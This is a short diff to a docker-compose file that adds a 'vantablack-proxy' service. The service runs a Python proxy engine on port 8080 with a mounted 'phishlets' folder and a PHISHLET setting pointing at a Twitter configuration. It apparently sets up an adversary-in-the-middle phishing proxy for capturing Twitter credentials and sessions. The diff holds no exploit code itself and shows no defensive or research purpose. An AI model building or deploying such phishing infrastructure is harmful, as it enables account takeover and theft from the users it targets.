@@ -1,4 +1,18 @@
 services:
+  # Proxy Engine (VantaProxy)
+  vantablack-proxy:
+    build:
+      context: .
+      dockerfile: Dockerfile.api
+    command: ["python", "engine/proxy.py"]
+    ports:
+      - "8080:8080"
+    environment:
+      - PHISHLET=phishlets/twitter.yaml
+    volumes:
+      - ./phishlets:/app/phishlets
+    restart: unless-stopped
+
   # API Gateway
   vantablack-api:
     build: 
